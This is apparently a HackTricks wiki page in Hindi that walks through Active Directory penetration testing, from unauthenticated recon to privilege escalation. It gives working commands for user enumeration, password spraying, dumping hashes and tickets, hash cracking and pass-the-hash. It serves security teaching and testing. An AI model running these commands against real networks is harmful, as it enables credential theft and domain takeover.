# Active Directory कार्यप्रणाली

{{#include ../../banners/hacktricks-training.md}}

## मूल अवलोकन

**Active Directory** एक बुनियादी तकनीक के रूप में कार्य करता है, जो **network administrators** को नेटवर्क के भीतर **domains**, **users**, और **objects** को कुशलतापूर्वक बनाने और प्रबंधित करने में सक्षम बनाता है। यह बड़े पैमाने पर स्केल करने के लिए डिज़ाइन किया गया है, जिससे बहुत सारे उपयोगकर्ताओं को प्रबंधनीय **groups** और **subgroups** में व्यवस्थित किया जा सकता है, साथ ही विभिन्न स्तरों पर **access rights** को नियंत्रित किया जा सकता है।

**Active Directory** की संरचना तीन मुख्य परतों से बनी है: **domains**, **trees**, और **forests**। एक **domain** उन objects का संग्रह होता है, जैसे **users** या **devices**, जो एक साझा database साझा करते हैं। **Trees** इन domains के समूह होते हैं जो एक साझा संरचना द्वारा जुड़े होते हैं, और एक **forest** कई trees का संग्रह होता है, जो आपस में **trust relationships** के द्वारा जुड़े होते हैं, जो संगठनात्मक संरचना की सबसे ऊपरी परत बनाते हैं। विशिष्ट **access** और **communication rights** प्रत्येक स्तर पर निर्दिष्ट किए जा सकते हैं।

**Active Directory** के भीतर प्रमुख अवधारणाएँ शामिल हैं:

1. **Directory** – Active Directory objects से संबंधित सभी जानकारी को संग्रहीत करती है।
2. **Object** – डायरेक्टरी के भीतर संस्थाओं को दर्शाता है, जिनमें **users**, **groups**, या **shared folders** शामिल हैं।
3. **Domain** – डायरेक्टरी objects के लिए एक container के रूप में कार्य करता है, एक **forest** के भीतर कई domains सह-अस्तित्व में रह सकते हैं, और प्रत्येक का अपना object संग्रह होता है।
4. **Tree** – domains का एक समूह जो एक साझा root domain साझा करते हैं।
5. **Forest** – Active Directory में संगठनात्मक संरचना की सबसे ऊपरी परत, जो कई trees से मिलकर बनती है और उनके बीच **trust relationships** होते हैं।

**Active Directory Domain Services (AD DS)** में केंद्रीय प्रबंधन और नेटवर्क के भीतर संचार के लिए आवश्यक विभिन्न सेवाएँ शामिल हैं। ये सेवाएँ निम्नलिखित हैं:

1. **Domain Services** – डेटा स्टोरेज को केंद्रीकृत करता है और **users** और **domains** के बीच इंटरैक्शन का प्रबंधन करता है, जिसमें **authentication** और **search** कार्यक्षमताएँ शामिल हैं।
2. **Certificate Services** – सुरक्षित **digital certificates** के निर्माण, वितरण और प्रबंधन की देखरेख करता है।
3. **Lightweight Directory Services** – **LDAP protocol** के माध्यम से directory-enabled applications का समर्थन करता है।
4. **Directory Federation Services** – कई वेब एप्लिकेशनों में एकल सत्र के दौरान उपयोगकर्ताओं को प्रमाणित करने के लिए **single-sign-on** क्षमताएँ प्रदान करता है।
5. **Rights Management** – कॉपीराइट सामग्री की अनधिकृत वितरण और उपयोग को नियंत्रित करके उसकी सुरक्षा में मदद करता है।
6. **DNS Service** – **domain names** के समाधान के लिए महत्वपूर्ण है।

और विस्तृत विवरण के लिए देखें: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

AD पर हमला करना सीखने के लिए आपको **Kerberos authentication process** को बहुत अच्छी तरह समझना होगा।\
[**यदि आप अभी भी नहीं जानते कि यह कैसे काम करता है तो इस पृष्ठ को पढ़ें।**](kerberos-authentication.md)

## चिट शीट

आप तेज़ी से यह देखने के लिए [https://wadcoms.github.io/](https://wadcoms.github.io) का उपयोग कर सकते हैं कि AD को enumerate/exploit करने के लिए कौन-कौन से कमांड चलाए जा सकते हैं।

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

यदि आपके पास केवल एक AD environment तक पहुँच है लेकिन आपके पास कोई credentials/sessions नहीं हैं तो आप कर सकते हैं:

- **Pentest the network:**
- नेटवर्क को scan करें, मशीनें और खुले पोर्ट खोजें और कोशिश करें कि उनसे **exploit vulnerabilities** करें या उनसे **extract credentials** करें (उदाहरण के लिए, [printers could be very interesting targets](ad-information-in-printers.md) ).
- DNS को enumerate करने से domain में प्रमुख सर्वरों के बारे में जानकारी मिल सकती है जैसे web, printers, shares, vpn, media, आदि।
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- इसको करने के बारे में अधिक जानकारी पाने के लिए General [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) देखें।
- **Check for null and Guest access on smb services** (यह आधुनिक Windows संस्करणों पर काम नहीं करेगा):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- SMB सर्वर को enumerate करने के बारे में एक अधिक विस्तृत गाइड यहाँ पाया जा सकता है:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- LDAP को enumerate करने के बारे में एक अधिक विस्तृत गाइड यहाँ पाया जा सकता है (विशेष रूप से **anonymous access** पर ध्यान दें):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Responder का उपयोग करके सेवाओं का impersonating कर के credentials इकट्ठा करें ([**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md))
- [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) का उपयोग कर होस्ट तक पहुँच प्राप्त करें
- evil-S के साथ नकली UPnP सेवाओं का **exposing** करके credentials इकट्ठा करें ([**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856))
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- internal दस्तावेज़ों, social media, सेवाओं (मुख्यतः web) में और सार्वजनिक रूप से उपलब्ध स्रोतों से उपयोगकर्ता नाम/नाम निकालें।
- यदि आपको कंपनी कर्मचारियों के पूर्ण नाम मिलते हैं, तो आप विभिन्न AD **username conventions** आज़मा सकते हैं (**read this**). सबसे सामान्य conventions हैं: _NameSurname_, _Name.Surname_, _NamSur_ (प्रत्येक से 3 अक्षर), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) और [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) पृष्ठों को देखें।
- **Kerbrute enum**: जब कोई **invalid username is requested** होता है तो सर्वर **Kerberos error** कोड _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ का जवाब देगा, जिससे हम निर्धारित कर सकते हैं कि username अमान्य था। **Valid usernames** या तो AS-REP में **TGT** का उत्तर देंगे या error _KRB5KDC_ERR_PREAUTH_REQUIRED_ देंगे, जो संकेत करता है कि user को pre-authentication करना आवश्यक है।
- **No Authentication against MS-NRPC**: domain controllers पर MS-NRPC (Netlogon) इंटरफ़ेस के खिलाफ auth-level = 1 (No authentication) का उपयोग करना। यह विधि MS-NRPC इंटरफ़ेस को bind करने के बाद `DsrGetDcNameEx2` फ़ंक्शन को कॉल करती है ताकि बिना किसी credentials के यह जांचा जा सके कि user या computer मौजूद है या नहीं। इस प्रकार के enumeration को लागू करने वाला टूल [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) है। शोध यहाँ पाया जा सकता है [यहाँ](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

यदि आपने नेटवर्क में इन में से किसी server को पाया है, तो आप इसके खिलाफ **user enumeration** भी कर सकते हैं। उदाहरण के लिए, आप टूल [**MailSniper**](https://github.com/dafthack/MailSniper) का उपयोग कर सकते हैं:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> आप उपयोगकर्ता नामों (usernames) की सूचियाँ [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  और इस रिपॉजिटरी में ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) पा सकते हैं।
>
> हालांकि, आपके पास उस recon चरण से कंपनी में काम करने वाले लोगों के **नाम** होने चाहिए जो आपने पहले किया था। नाम और उपनाम के साथ आप स्क्रिप्ट [**namemash.py**](https://gist.github.com/superkojiman/11076951) का उपयोग संभावित वैध उपयोगकर्ता नाम (usernames) जनरेट करने के लिए कर सकते हैं।

### Knowing one or several usernames

ठीक है, तो आपको पता है कि आपके पास पहले से एक वैध username है पर कोई password नहीं... फिर कोशिश करें:

- [**ASREPRoast**](asreproast.md): यदि किसी user के पास attribute _DONT_REQ_PREAUTH_ **नहीं है** तो आप उस user के लिए एक AS_REP message request कर सकते हैं, जो उस user के password के व्युत्पन्न से encrypted कुछ डेटा रखेगा।
- [**Password Spraying**](password-spraying.md): हर खोजे गए user के साथ सबसे **आम passwords** आजमाएँ, शायद कोई user खराब password उपयोग कर रहा हो (keep in mind the password policy!)।
- ध्यान दें कि आप users के mail servers तक पहुँचने की कोशिश के लिए **spray OWA servers** भी कर सकते हैं।


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

आप नेटवर्क के कुछ प्रोटोकॉल्स को poison करके crack करने के लिए कुछ challenge hashes प्राप्त कर सकते हैं:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

यदि आप active directory को enumerate करने में सफल रहे हैं तो आपके पास अधिक ईमेल और नेटवर्क की बेहतर समझ होगी। आप AD env तक पहुँचने के लिए NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) को मजबूर करने में सक्षम हो सकते हैं।

### NetExec workspace-driven recon & relay posture checks

- Use **`nxcdb` workspaces** to keep AD recon state per engagement: `workspace create <name>` spawns per-protocol SQLite DBs under `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Switch views with `proto smb|mssql|winrm` and list gathered secrets with `creds`. Manually purge sensitive data when done: `rm -rf ~/.nxc/workspaces/<name>`.
- Quick subnet discovery with **`netexec smb <cidr>`** surfaces **domain**, **OS build**, **SMB signing requirements**, and **Null Auth**. Members showing `(signing:False)` are **relay-prone**, while DCs often require signing.
- Generate **hostnames in /etc/hosts** straight from NetExec output to ease targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- जब **SMB relay to the DC is blocked** by signing हो, तब भी **LDAP** की posture जाँचें: `netexec ldap <dc>` `(signing:None)` / weak channel binding को दर्शाता है। SMB signing required लेकिन LDAP signing disabled वाला DC abuses जैसे **SPN-less RBCD** के लिए अभी भी एक viable **relay-to-LDAP** target बना रहता है।

### Client-side printer credential leaks → bulk domain credential validation

- Printer/web UIs कभी-कभी **embed masked admin passwords in HTML**. Viewing source/devtools करने पर cleartext सामने आ सकता है (उदा., `<input value="<password>">`), जिससे Basic-auth के जरिए scan/print repositories तक पहुंच मिल सकती है।
- प्राप्त print jobs में per-user passwords के साथ **plaintext onboarding docs** हो सकते हैं। टेस्टिंग करते समय pairings को aligned रखें:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

यदि आप **null या guest user** के साथ अन्य PCs या shares में **access** कर सकते हैं तो आप **files** (जैसे SCF file) रख सकते हैं जो अगर किसी तरह access हो जाएँ तो यह आप के खिलाफ NTLM authentication को ट्रिगर कर देंगे ताकि आप **NTLM challenge** चोरी करके उसे क्रैक कर सकें:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** हर उस NT hash को एक candidate password की तरह treat करता है जो आपके पास पहले से मौजूद है, उन slower formats के लिए जिनका key material सीधे NT hash से निकला होता है। Kerberos RC4 tickets, NetNTLM challenges, या cached credentials में लंबे पासफ़्रेज़ को brute-force करने के बजाय आप NT hashes को Hashcat के NT-candidate modes में डालते हैं और यह बिना plaintext जाने password reuse को validate कर देता है। यह डोमेन compromise के बाद खासकर शक्तिशाली होता है जब आप हजारों current और historical NT hashes harvest कर चुके होते हैं।

Use shucking जब:

- आपके पास DCSync, SAM/SECURITY dumps, या credential vaults से एक NT corpus हो और आपको दूसरे domains/forests में reuse टेस्ट करना हो।
- आपने RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, या DCC/DCC2 blobs capture किये हों।
- आप जल्दी से यह साबित करना चाहते हैं कि लंबे, uncrackable पासफ़्रेज़ reuse हो रहे हैं और तुरंत Pass-the-Hash से pivot करना चाहते हैं।

यह technique उन encryption types के खिलाफ काम नहीं करती जिनकी keys NT hash नहीं हैं (उदा., Kerberos etype 17/18 AES)। अगर किसी domain में AES-only लागू है तो आपको regular password modes पर लौटना होगा।

#### Building an NT hash corpus

- **DCSync/NTDS** – इतिहास के साथ `secretsdump.py` का उपयोग करके जितने संभव हो उतने NT hashes (और उनके previous values) निकालें:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries candidate pool को काफी विस्तारित कर देते हैं क्योंकि Microsoft प्रत्येक account के लिए 24 previous hashes तक store कर सकता है। NTDS secrets harvest करने के और तरीकों के लिए देखें:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (या Mimikatz `lsadump::sam /patch`) local SAM/SECURITY डेटा और cached domain logons (DCC/DCC2) निकालता है। इन hashes को deduplicate करके उसी `nt_candidates.txt` सूची में जोड़ें।
- **Track metadata** – हर hash के साथ उस username/domain को रखें जिसने उसे दिया था (भले ही wordlist केवल hex ही क्यों न रखता हो)। एक बार Hashcat winning candidate दिखा दे तो matching hashes तुरंत बताती हैं कि कौन सा principal password reuse कर रहा है।
- उसी forest या trusted forest से candidates को प्राथमिकता दें; इससे shucking करते समय overlap की संभावना अधिक रहती है।

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**। rule engines को disable रखें (कोई `-r`, कोई hybrid modes नहीं) क्योंकि mangling candidate key material को corrupt कर देता है।
- ये modes स्वयं में तेज़ नहीं होते, लेकिन NTLM keyspace (~30,000 MH/s on an M3 Max) Kerberos RC4 (~300 MH/s) की तुलना में ~100× तेज़ है। curated NT list को टेस्ट करना slow format में पूरे password space को खोजने से कहीं सस्ता है।
- हमेशा **latest Hashcat build** चलाएं (`git clone https://github.com/hashcat/hashcat && make install`) क्योंकि modes 31500/31600/35300/35400 हाल ही में आये हैं।
- फिलहाल AS-REQ Pre-Auth के लिए कोई NT mode नहीं है, और AES etypes (19600/19700) के लिए plaintext की ज़रूरत होती है क्योंकि उनकी keys PBKDF2 के माध्यम से UTF-16LE passwords से derive होती हैं, न कि raw NT hashes से।

#### Example – Kerberoast RC4 (mode 35300)

1. एक low-privileged user के साथ target SPN के लिए RC4 TGS capture करें (details के लिए Kerberoast पेज देखें):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. अपनी NT list से ticket को shuck करें:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat हर NT candidate से RC4 key derive करता है और `$krb5tgs$23$...` blob को validate करता है। मैच मिलना इस बात की पुष्टि है कि service account आपके मौजूदा NT hashes में से किसी एक का उपयोग कर रहा है।

3. तुरंत PtH के द्वारा pivot करें:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

आप आवश्यकता पड़ने पर बाद में plaintext भी recover कर सकते हैं: `hashcat -m 1000 <matched_hash> wordlists/`।

#### Example – Cached credentials (mode 31600)

1. compromised workstation से cached logons dump करें:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. दिलचस्प domain user के लिए DCC2 line को `dcc2_highpriv.txt` में कॉपी करें और उसे shuck करें:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. सफल match आपके list में पहले से मौजूद NT hash को देता है, यह साबित करता है कि cached user password reuse कर रहा है। इसे सीधे PtH के लिए उपयोग करें (`nxc smb <dc_ip> -u highpriv -H <hash>`) या fast NTLM mode में brute-force करके string recover करें।

यही workflow NetNTLM challenge-responses (`-m 27000/27100`) और DCC (`-m 31500`) पर भी लागू होता है। एक बार match identify होने के बाद आप relay, SMB/WMI/WinRM PtH लॉन्च कर सकते हैं, या offline masks/rules के साथ NT hash को फिर से क्रैक कर सकते हैं।

## Enumerating Active Directory WITH credentials/session

इस चरण के लिए आपके पास एक valid domain account के credentials या session का **compromise** होना आवश्यक है। अगर आपके पास कुछ valid credentials या domain user के रूप में shell है, तो **आपको याद रखना चाहिए कि पहले बताए गए विकल्प अभी भी अन्य users को compromise करने के विकल्प बने रहते हैं**।

authenticated enumeration शुरू करने से पहले आपको **Kerberos double hop problem** क्या है यह जानना चाहिए।

{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

किसी account का compromise होना पूरे domain को compromise करने की शुरूआत का एक बड़ा कदम है, क्योंकि अब आप Active Directory Enumeration शुरू कर पाएँगे:

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Windows से सारे domain usernames प्राप्त करना बहुत आसान है (`net user /domain` ,`Get-DomainUser` या `wmic useraccount get name,sid`)। Linux में आप उपयोग कर सकते हैं: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` या `enum4linux -a -u "user" -p "password" <DC IP>`

> भले ही यह Enumeration section छोटा लगे, यह सब में सबसे महत्वपूर्ण हिस्सा है। उन links (मुख्यतः cmd, powershell, powerview और BloodHound) को खोलें, सीखें कि domain को कैसे enumerate करना है और तब तक अभ्यास करें जब तक आप comfortable न हों। एक assessment के दौरान यह DA तक पहुँचने या यह तय करने का महत्वपूर्ण पल होगा कि आगे कुछ किया जा सकता है या नहीं।

### Kerberoast

Kerberoasting में उन **TGS tickets** को प्राप्त करना शामिल है जो services से जुड़ी user accounts द्वारा उपयोग होते हैं और उनकी encryption (जो user passwords पर आधारित होती है) को offline crack करना होता है।

इस बारे में और पढ़ें:

{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

एक बार जब आपने कुछ credentials प्राप्त कर लिए हैं तो आप जाँच सकते हैं कि क्या आपको किसी भी **machine** तक access है। इसके लिए आप अपने port scans के अनुसार कई servers पर विभिन्न protocols के साथ connect करने के लिए **CrackMapExec** का उपयोग कर सकते हैं।

### Local Privilege Escalation

अगर आपके पास compromised credentials या एक regular domain user के रूप में session है और इस user से आपको domain की किसी भी machine तक **access** मिलती है तो आपको locally privileges escalate करने और credentials loot करने की कोशिश करनी चाहिए। क्योंकि केवल local administrator privileges होने पर आप अन्य users के hashes memory (LSASS) या लोकल (SAM) से dump कर पाएँगे।

इस पुस्तक में [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) पर एक पूरा पृष्ठ है और एक [**checklist**](../checklist-windows-privilege-escalation.md)। साथ ही, WinPEAS का उपयोग करना न भूलें: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)。

### Current Session Tickets

यह बहुत **unlikely** है कि आपको current user के पास ऐसे **tickets** मिलें जो आपको unexpected resources तक पहुँच की permission दें, पर आप जाँच कर सकते हैं:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

यदि आप Active Directory का enumeration करने में सफल रहे हैं तो आपके पास **अधिक ईमेल और नेटवर्क की बेहतर समझ** होगी। आप NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)** को मजबूर करने में सक्षम हो सकते हैं।**

### Looks for Creds in Computer Shares | SMB Shares

अब जब आपके पास कुछ बेसिक credentials हैं तो आपको यह जांचना चाहिए कि क्या आप AD के अंदर साझा की जा रही किसी भी दिलचस्प फ़ाइल को **खोज** सकते हैं। आप यह मैन्युअली कर सकते हैं लेकिन यह बहुत उबाऊ और दोहरावदार काम है (और और भी अधिक अगर आपको सैकड़ों दस्तावेज़ों की जाँच करनी पड़े)।

[**इन टूल्स के बारे में जानने के लिए इस लिंक का पालन करें।**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

यदि आप अन्य PCs या shares तक **access** कर सकते हैं तो आप फ़ाइलें **place** कर सकते हैं (जैसे एक SCF file) जो यदि किसी तरह एक्सेस हो जाती हैं तो यह आपके खिलाफ एक **NTLM authentication को trigger** करेगी ताकि आप **NTLM challenge** को **steal** करके उसे crack कर सकें:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

इस vulnerability ने किसी भी authenticated उपयोगकर्ता को domain controller को **compromise** करने की अनुमति दी।


{{#ref}}
printnightmare.md
{{#endref}}

## Active Directory पर Privilege escalation WITH privileged credentials/session

**निम्नलिखित techniques के लिए एक सामान्य domain user पर्याप्त नहीं है, इन attacks को करने के लिए आपको कुछ विशेष privileges/credentials की आवश्यकता होगी।**

### Hash extraction

आशा है कि आप [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) (relaying सहित), [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html) का उपयोग करके कुछ local admin खाते को **compromise** करने में सफल रहे होंगे।\
फिर, यह समय है कि सभी hashes को memory और लोकल रूप से dump करने का।\
[**हैश प्राप्त करने के विभिन्न तरीकों के बारे में इस पृष्ठ को पढ़ें।**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**एक बार जब आपके पास किसी user का hash हो**, आप उसका उपयोग उसे **impersonate** करने के लिए कर सकते हैं।\
आपको कुछ ऐसे **tool** का उपयोग करना होगा जो उस **hash** का उपयोग करके **NTLM authentication** को **perform** करे, **या** आप एक नया **sessionlogon** बना कर उस **hash** को **LSASS** के अंदर **inject** कर सकते हैं, ताकि जब भी कोई **NTLM authentication** performed हो, वह **hash** उपयोग किया जाए। आखिरी विकल्प वही है जो mimikatz करता है।\
[**अधिक जानकारी के लिए इस पृष्ठ को पढ़ें।**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

यह हमला उपयोगकर्ता के NTLM hash का उपयोग करके Kerberos tickets request करने का उद्देश्य रखता है, जो NTLM पर सामान्य Pass The Hash के विकल्प के रूप में है। इसलिए, यह विशेष रूप से उन नेटवर्कों में उपयोगी हो सकता है जहाँ NTLM protocol disabled है और केवल Kerberos को authentication protocol के रूप में अनुमति है।


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Pass The Ticket (PTT) attack method में, attackers उपयोगकर्ता का password या hash मानों के बजाय उसका authentication ticket **steal** करते हैं। यह चोरी किया हुआ ticket फिर उपयोगकर्ता को **impersonate** करने के लिए उपयोग किया जाता है, जिससे नेटवर्क के भीतर resources और services तक अनाधिकृत पहुँच प्राप्त होती है।


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

यदि आपके पास किसी local administrator का **hash** या **password** है, तो आपको इसके साथ अन्य **PCs** पर **login locally** करने का प्रयास करना चाहिए।
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> ध्यान दें कि यह काफी **शोरगुल** है और **LAPS** इसे **कम** कर देगा।

### MSSQL Abuse & Trusted Links

यदि किसी user के पास **access MSSQL instances** की privileges हैं, तो वह इसका उपयोग MSSQL host पर **execute commands** करने के लिए कर सकता है (यदि वह SA के रूप में चल रहा हो), NetNTLM **hash** को **steal** कर सकता है या यहाँ तक कि **relay** **attack** कर सकता है।\
इसके अलावा, यदि एक MSSQL instance को किसी दूसरे MSSQL instance द्वारा trusted (database link) किया गया है और user के पास trusted database पर privileges हैं, तो वह **use the trust relationship to execute queries also in the other instance** कर पाएगा। ये trusts chained हो सकते हैं और किसी बिंदु पर user को एक misconfigured database मिल सकती है जहाँ वह commands execute कर सके।\
**The links between databases work even across forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Third-party inventory और deployment suites अक्सर credentials और code execution तक पहुंच के लिए शक्तिशाली रास्ते खोलते हैं। देखें:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

यदि आप किसी Computer object में [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) attribute पाते हैं और आपके पास उस computer में domain privileges हैं, तो आप उस computer पर login करने वाले हर user के memory से TGTs dump कर सकेंगे।\
